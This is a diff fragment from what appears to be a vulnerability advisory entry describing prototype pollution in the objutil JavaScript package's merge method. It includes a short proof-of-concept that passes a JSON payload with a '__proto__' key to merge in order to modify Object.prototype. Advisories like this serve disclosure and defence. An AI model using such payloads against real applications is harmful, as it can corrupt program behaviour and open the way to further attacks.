@@ -3,7 +3,7 @@
   title: Prototype Pollution
   description: "[objutil][1] is a Javascript Object util methods with deep traverse,\nwith
     ES6 tree shaking methods.\n\nAffected versions of this package are vulnerable
-    to Prototype Pollution.\nThe `merge` method could be tricked into adding or modifying
+    to Prototype Pollution.\nThe `merge` method could be tricked into adding or modifying
     properties\nof `Object.prototype`.\n\n### PoC   {#poc}\n\n    var a = { x:1,y:{
     w:1, z:2 }}\n    var malicious_payload = '{\"__proto__\":{\"vulnerable\":\"Polluted\"}}';\n
     \   var {merge, remove} = require('objutil')\n    result = merge(a,JSON.parse(malicious_payload));\n
